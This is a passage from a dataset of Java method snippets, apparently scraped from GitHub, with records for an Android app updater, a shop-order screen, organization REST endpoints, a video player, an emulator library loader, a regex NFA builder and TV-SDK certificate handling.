null;\n                } finally {\n                    try {\n                        input.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                        file = null;\n                    }\n                }\n                returnList.add(localVersion);\n                returnList.add(serverVersion);\n                returnList.add(file);\n            }\n        } catch (Exception e) {\n            returnList.add(-2);\n            returnList.add(-2);\n            returnList.add(null);\n        }\n        return  returnList;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Tasks/GetUpdateAppAsyncTask.java", "stars": "9", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["public"]}}, {"id": 59185, "method_name": "onProgressUpdate", "class_name": "GetUpdateAppAsyncTask", "params": ["Integer"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onProgressUpdate(Integer... progress) {\n        super.onProgressUpdate(progress);\n        // if we get here, length is known, now set indeterminate to false\n        if (!mProgressDialog.isShowing())\n            mProgressDialog.show();\n        mProgressDialog.setMessage(activity.getString(R.string.UPDATE_PROGRESS_MESSAGE));\n        mProgressDialog.setIndeterminate(false);\n        mProgressDialog.setMax(100);\n        mProgressDialog.setProgress(progress[0]);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Tasks/GetUpdateAppAsyncTask.java", "stars": "9", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["public"]}}, {"id": 59186, "method_name": "onPostExecute", "class_name": "GetUpdateAppAsyncTask", "params": ["List<Object>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPostExecute(List<Object> list) {\n        //activity.getSupportFragmentManager().beginTransaction().remove(mSpinnerFragment).commit();\n        mWakeLock.release();\n        mProgressDialog.dismiss();\n        if (list.size() <= 0)\n            this.listener.onCheckForUpdateTaskCompleted(-1,-1,null);\n        else {\n            int localVer = -2;\n            int serverVer = -2;\n            File downloadFile = null;\n            if (list.get(0) != null && list.get(0) instanceof Integer)\n                localVer = (int)list.get(0);\n            if (list.get(1) != null && list.get(1) instanceof  Integer)\n                serverVer = (int)list.get(1);\n            if (list.get(2) != null && list.get(2) instanceof  File)\n                downloadFile = (File)list.get(2);\n\n            this.listener.onCheckForUpdateTaskCompleted(localVer,serverVer,downloadFile);\n        }\n        super.onPostExecute(list);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Tasks/GetUpdateAppAsyncTask.java", "stars": "9", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["public"]}}, {"id": 59187, "method_name": "onCreateView", "class_name": "FragmentOrderDetail", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n\n\n        setRetainInstance(true);\n        View rootView = inflater.inflate(R.layout.fragment_order_detail_screen, container, false);\n\n\n        ButterKnife.bind(this,rootView);\n\n\n        recyclerView = rootView.findViewById(R.id.recyclerView);\n        swipeContainer = rootView.findViewById(R.id.swipeContainer);\n\n        order = PrefOrderDetail.getOrder(getActivity());\n\n\n\n        if(savedInstanceState==null)\n        {\n            makeRefreshNetworkCall();\n        }\n\n\n\n\n        serviceName.setVisibility(View.VISIBLE);\n        serviceName.setText(\"Order ID : \" + order.getOrderID());\n\n\n\n        setupRecyclerView();\n        setupSwipeContainer();\n\n\n        return rootView;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59188, "method_name": "setupSwipeContainer", "class_name": "FragmentOrderDetail", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setupSwipeContainer()\n    {\n        if(swipeContainer!=null) {\n\n            swipeContainer.setOnRefreshListener(this);\n            swipeContainer.setColorSchemeResources(android.R.color.holo_blue_bright,\n                    android.R.color.holo_green_light,\n                    android.R.color.holo_orange_light,\n                    android.R.color.holo_red_light);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59189, "method_name": "setupRecyclerView", "class_name": "FragmentOrderDetail", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setupRecyclerView()\n    {\n\n        adapter = new Adapter(dataset,getActivity(),this);\n        LinearLayoutManager layoutManager = new LinearLayoutManager(getActivity());\n        recyclerView.setAdapter(adapter);\n        recyclerView.setLayoutManager(layoutManager);\n        recyclerView.addItemDecoration(new DividerItemDecoration(getActivity(), DividerItemDecoration.VERTICAL));\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59190, "method_name": "onRefresh", "class_name": "FragmentOrderDetail", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRefresh() {\n\n        makeNetworkCall();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59191, "method_name": "makeRefreshNetworkCall", "class_name": "FragmentOrderDetail", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void makeRefreshNetworkCall()\n    {\n\n        swipeContainer.post(new Runnable() {\n            @Override\n            public void run() {\n                swipeContainer.setRefreshing(true);\n\n                onRefresh();\n            }\n        });\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59192, "method_name": "makeNetworkCall", "class_name": "FragmentOrderDetail", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void makeNetworkCall()\n    {\n\n        Call<OrderItemEndPoint> call = orderItemService.getOrderItem(\n                PrefLogin.getAuthorizationHeaders(getActivity()),\n                order.getOrderID(),\n                null,\n                order.getShopID(),\n                PrefLocation.getLatitude(getActivity()),PrefLocation.getLongitude(getActivity()),\n                null,null,\n                null,null);\n\n\n\n\n\n\n\n        call.enqueue(new Callback<OrderItemEndPoint>() {\n            @Override\n            public void onResponse(Call<OrderItemEndPoint> call, Response<OrderItemEndPoint> response) {\n\n                if(isDestroyed)\n                {\n                    return;\n                }\n\n\n                if(response.code()==200 && response.body()!=null)\n                {\n\n                    dataset.clear();\n\n                    // fetch extra order details\n                    Order extraDetails = response.body().getOrderDetails();\n\n                    if(extraDetails!=null)\n                    {\n                        order.setItemTotal(extraDetails.getItemTotal());\n                        order.setAppServiceCharge(extraDetails.getAppServiceCharge());\n                        order.setDeliveryCharges(extraDetails.getDeliveryCharges());\n                        order.setSavingsOverMRP(extraDetails.getSavingsOverMRP());\n                    }\n\n\n                    dataset.add(0,order);\n                    dataset.add(response.body().getShopDetails());\n                    dataset.add(new HeaderTitle(\"Items in this Order\"));\n                    dataset.addAll(response.body().getResults());\n\n                    adapter.notifyDataSetChanged();\n\n\n                }\n                else\n                {\n                    showToastMessage(\"Failed : Code \" + response.code());\n                }\n\n\n\n\n                swipeContainer.setRefreshing(false);\n\n            }\n\n            @Override\n            public void onFailure(Call<OrderItemEndPoint> call, Throwable t) {\n\n\n                if(isDestroyed)\n                {\n                    return;\n                }\n\n                showToastMessage(\"Network Request failed !\");\n\n\n                swipeContainer.setRefreshing(false);\n\n            }\n        });\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59193, "method_name": "showToastMessage", "class_name": "FragmentOrderDetail", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showToastMessage(String message)\n    {\n        if(getActivity()!=null)\n        {\n            Toast.makeText(getActivity(),message,Toast.LENGTH_SHORT).show();\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59194, "method_name": "onDestroy", "class_name": "FragmentOrderDetail", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroy() {\n        super.onDestroy();\n        isDestroyed=true;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59195, "method_name": "showLog", "class_name": "FragmentOrderDetail", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showLog(String message)\n    {\n        Log.d(\"order_detail\",message);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59196, "method_name": "listItemClick", "class_name": "FragmentOrderDetail", "params": ["Item", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void listItemClick(Item item, int position) {\n\n        Intent intent = new Intent(getActivity(), ItemDetail.class);\n        String itemJson = UtilityFunctions.provideGson().toJson(item);\n        intent.putExtra(ItemDetailFragment.TAG_JSON_STRING,itemJson);\n\n        startActivity(intent);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59197, "method_name": "listItemClick", "class_name": "FragmentOrderDetail", "params": ["Shop", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void listItemClick(Shop shop, int position) {\n\n            Intent intent = new Intent(getActivity(), ShopDetail.class);\n            String shopJson = UtilityFunctions.provideGson().toJson(shop);\n            intent.putExtra(ShopDetailFragment.TAG_JSON_STRING,shopJson);\n            startActivity(intent);\n        }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59198, "method_name": "editClick", "class_name": "FragmentOrderDetail", "params": ["Shop", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void editClick(Shop shop, int position) {\n\n            // ignore because its not required here\n        }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/DetailScreens/DetailOrder/FragmentOrderDetail.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": ["SwipeRefreshLayout", "ViewHolderOrderItem", "ViewHolderShopSmall"], "modifiers": ["public"]}}, {"id": 59199, "method_name": "getAllOrganizations", "class_name": "OrganizationsController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<OrganizationResponse>", "snippet": "    public List<OrganizationResponse> getAllOrganizations() {\n        return organizationsReadService.getOrganizations().stream()\n                .map(dtoConverter::convert)\n                .collect(toList());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/OrganizationsController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59200, "method_name": "registerOrganization", "class_name": "OrganizationsController", "params": ["User", "NewOrganizationRequest"], "throws": null, "modifiers": ["public"], "return_type": "UUID", "snippet": "    public UUID registerOrganization(User requestingUser, @RequestBody @Valid NewOrganizationRequest request) {\n        return organizationsService.createOrganization(\n                requestingUser.getId(), request.getOrganizationName(), request.getStreet(),\n                request.getCity(), request.getState(), request.getCountry(), request.getPostalCode(), request.getWebsiteUrl(),\n                request.getContactName(), request.getContactPhoneNumber(), request.getContactEmail());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/OrganizationsController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59201, "method_name": "getOrganization", "class_name": "OrganizationsController", "params": ["User", "UUID"], "throws": null, "modifiers": ["public"], "return_type": "OrganizationResponse", "snippet": "    public OrganizationResponse getOrganization(User requestingUser, @PathVariable UUID organizationId) {\n        return dtoConverter.convert(organizationsReadService.getById(organizationId));\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/OrganizationsController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59202, "method_name": "updateOrganization", "class_name": "OrganizationsController", "params": ["User", "UUID", "UpdateOrganizationRequest"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateOrganization(User requestingUser, @PathVariable UUID organizationId,\n                                   @RequestBody @Valid UpdateOrganizationRequest request) {\n        organizationsService.updateOrganization(requestingUser.getId(), organizationId,\n                request.getOrganizationName(), request.getStreet(), request.getCity(), request.getState(), request.getCountry(),\n                request.getPostalCode(), request.getWebsiteUrl(), request.getContactName(), request.getPhoneNumber(),\n                request.getEmailAddress());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/OrganizationsController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59203, "method_name": "deregisterOrganization", "class_name": "OrganizationsController", "params": ["User", "UUID"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deregisterOrganization(User requestingUser, @PathVariable UUID organizationId) {\n        organizationsService.deregisterOrganization(requestingUser.getId(), organizationId);\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/OrganizationsController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59204, "method_name": "reregisterOrganization", "class_name": "OrganizationsController", "params": ["User", "UUID"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reregisterOrganization(User requestingUser, @PathVariable UUID organizationId) {\n        organizationsService.reregisterOrganization(requestingUser.getId(), organizationId);\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/OrganizationsController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59205, "method_name": "listOrganizationUsers", "class_name": "OrganizationsController", "params": ["User", "UUID"], "throws": null, "modifiers": ["public"], "return_type": "List<UserResponse>", "snippet": "    public List<UserResponse> listOrganizationUsers(User requestingUser, @PathVariable UUID organizationId) {\n        return usersReadService.getUsersForOrganization(organizationId).stream()\n                .map(dtoConverter::convert)\n                .collect(toList());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/OrganizationsController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59206, "method_name": "createUser", "class_name": "OrganizationsController", "params": ["User", "UUID", "NewUserRequest"], "throws": null, "modifiers": ["public"], "return_type": "UUID", "snippet": "    public UUID createUser(User requestingUser, @PathVariable UUID organizationId, @RequestBody @Valid NewUserRequest request) {\n        return usersService.createUser(requestingUser.getId(),\n                organizationId, request.getUsername(), request.getDisplayName(), request.getPassword());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/OrganizationsController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59207, "method_name": "getLayoutId", "class_name": "NormalGSYVideoPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId() {\n        return R.layout.video_layout_normal;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/NormalGSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59208, "method_name": "updateStartImage", "class_name": "NormalGSYVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void updateStartImage() {\n        if(mStartButton instanceof ImageView) {\n            ImageView imageView = (ImageView) mStartButton;\n            if (mCurrentState == CURRENT_STATE_PLAYING) {\n                imageView.setImageResource(R.drawable.video_click_pause_selector);\n            } else if (mCurrentState == CURRENT_STATE_ERROR) {\n                imageView.setImageResource(R.drawable.video_click_play_selector);\n            } else {\n                imageView.setImageResource(R.drawable.video_click_play_selector);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/NormalGSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 59209, "method_name": "getName", "class_name": "IpaLibraryFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return executable;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/ipa/IpaLibraryFile.java", "stars": "16", "class_props": {"extends": null, "implements": ["LibraryFile"], "modifiers": ["public"]}}, {"id": 59210, "method_name": "getMapRegionName", "class_name": "IpaLibraryFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMapRegionName() {\n        return executable;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/ipa/IpaLibraryFile.java", "stars": "16", "class_props": {"extends": null, "implements": ["LibraryFile"], "modifiers": ["public"]}}, {"id": 59211, "method_name": "resolveLibrary", "class_name": "IpaLibraryFile", "params": ["Emulator<?>", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "LibraryFile", "snippet": "    public LibraryFile resolveLibrary(Emulator<?> emulator, String soName) throws IOException {\n        if (!soName.contains(\"@rpath\")) {\n            return null;\n        }\n\n        String path = soName.replace(\"@rpath\", appDir + \"Frameworks\");\n        if (log.isDebugEnabled()) {\n            log.debug(\"Try resolve library soName=\" + soName + \", path=\" + path);\n        }\n        if (!loadList.isEmpty() && !loadList.contains(FilenameUtils.getName(path))) {\n            return null;\n        }\n        byte[] libData = IpaLoader.loadZip(ipa, path);\n        return libData == null ? null : new IpaLibraryFile(appDir, ipa, soName, libData, loadList);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/ipa/IpaLibraryFile.java", "stars": "16", "class_props": {"extends": null, "implements": ["LibraryFile"], "modifiers": ["public"]}}, {"id": 59212, "method_name": "readToByteArray", "class_name": "IpaLibraryFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] readToByteArray() {\n        return data;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/ipa/IpaLibraryFile.java", "stars": "16", "class_props": {"extends": null, "implements": ["LibraryFile"], "modifiers": ["public"]}}, {"id": 59213, "method_name": "mapBuffer", "class_name": "IpaLibraryFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ByteBuffer", "snippet": "    public ByteBuffer mapBuffer() {\n        return ByteBuffer.wrap(data);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/ipa/IpaLibraryFile.java", "stars": "16", "class_props": {"extends": null, "implements": ["LibraryFile"], "modifiers": ["public"]}}, {"id": 59214, "method_name": "getPath", "class_name": "IpaLibraryFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPath() {\n        return appDir + executable;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/ipa/IpaLibraryFile.java", "stars": "16", "class_props": {"extends": null, "implements": ["LibraryFile"], "modifiers": ["public"]}}, {"id": 59215, "method_name": "addParallelGraph", "class_name": "NFAGraph", "params": ["NFAGraph"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addParallelGraph(NFAGraph NFAGraph) {\n        NFAState newStart = new NFAState();\n        NFAState newEnd = new NFAState();\n        newStart.addNext(Constant.EPSILON, this.start);\n        newStart.addNext(Constant.EPSILON, NFAGraph.start);\n        this.end.addNext(Constant.EPSILON, newEnd);\n        NFAGraph.end.addNext(Constant.EPSILON, newEnd);\n        this.start = newStart;\n        this.end = newEnd;\n    }", "url": "https://raw.githubusercontent.com/xindoo/regex/master/src/main/java/xyz/xindoo/re/nfa/NFAGraph.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59216, "method_name": "addSeriesGraph", "class_name": "NFAGraph", "params": ["NFAGraph"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addSeriesGraph(NFAGraph NFAGraph) {\n        this.end.addNext(Constant.EPSILON, NFAGraph.start);\n        this.end = NFAGraph.end;\n    }", "url": "https://raw.githubusercontent.com/xindoo/regex/master/src/main/java/xyz/xindoo/re/nfa/NFAGraph.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59217, "method_name": "repeatStar", "class_name": "NFAGraph", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void repeatStar() {\n        repeatPlus();\n        addSToE(); // \u91cd\u590d0\n    }", "url": "https://raw.githubusercontent.com/xindoo/regex/master/src/main/java/xyz/xindoo/re/nfa/NFAGraph.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59218, "method_name": "addSToE", "class_name": "NFAGraph", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addSToE() {\n        start.addNext(Constant.EPSILON, end);\n    }", "url": "https://raw.githubusercontent.com/xindoo/regex/master/src/main/java/xyz/xindoo/re/nfa/NFAGraph.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59219, "method_name": "repeatPlus", "class_name": "NFAGraph", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void repeatPlus() {\n        NFAState newStart = new NFAState();\n        NFAState newEnd = new NFAState();\n        newStart.addNext(Constant.EPSILON, this.start);\n        end.addNext(Constant.EPSILON, newEnd);\n        end.addNext(Constant.EPSILON, start);\n        this.start = newStart;\n        this.end = newEnd;\n    }", "url": "https://raw.githubusercontent.com/xindoo/regex/master/src/main/java/xyz/xindoo/re/nfa/NFAGraph.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59220, "method_name": "getClientKey", "class_name": "WebOSTVServiceConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getClientKey() {\n        return clientKey;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59221, "method_name": "setClientKey", "class_name": "WebOSTVServiceConfig", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setClientKey(String clientKey) {\n        this.clientKey = clientKey;\n        notifyUpdate();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59222, "method_name": "getServerCertificate", "class_name": "WebOSTVServiceConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "X509Certificate", "snippet": "    public X509Certificate getServerCertificate() {\n        return cert;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59223, "method_name": "setServerCertificate", "class_name": "WebOSTVServiceConfig", "params": ["X509Certificate"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setServerCertificate(X509Certificate cert) {\n        this.cert = cert;\n        notifyUpdate();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59224, "method_name": "setServerCertificate", "class_name": "WebOSTVServiceConfig", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setServerCertificate(String cert) {\n        this.cert = loadCertificateFromPEM(cert);\n        notifyUpdate();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59225, "method_name": "getServerCertificateInString", "class_name": "WebOSTVServiceConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getServerCertificateInString() {\n        return exportCertificateToPEM(this.cert);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59226, "method_name": "exportCertificateToPEM", "class_name": "WebOSTVServiceConfig", "params": ["X509Certificate"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String exportCertificateToPEM(X509Certificate cert) {\n        try {\n            if (cert == null) \n                return null;\n            return Base64.encodeToString(cert.getEncoded(), Base64.DEFAULT);\n        } catch (CertificateEncodingException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59227, "method_name": "loadCertificateFromPEM", "class_name": "WebOSTVServiceConfig", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "X509Certificate", "snippet": "    private X509Certificate loadCertificateFromPEM(String pemString) {\n        CertificateFactory certFactory;\n        try {\n            certFactory = CertificateFactory.getInstance(\"X.509\");\n            ByteArrayInputStream inputStream = new ByteArrayInputStream(pemString.getBytes(\"US-ASCII\"));\n\n            return (X509Certificate)certFactory.generateCertificate(inputStream);\n        } catch (CertificateException e) {\n            e.printStackTrace();\n            return null;\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59228, "method_name": "toJSONObject", "class_name": "WebOSTVServiceConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject toJSONObject() {\n        JSONObject jsonObj = super.toJSONObject();\n\n        try {\n            jsonObj.put(KEY_CLIENT_KEY, clientKey);\n            jsonObj.put(KEY_CERT, exportCertificateToPEM(cert));\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        return jsonObj;\n    }", "url": 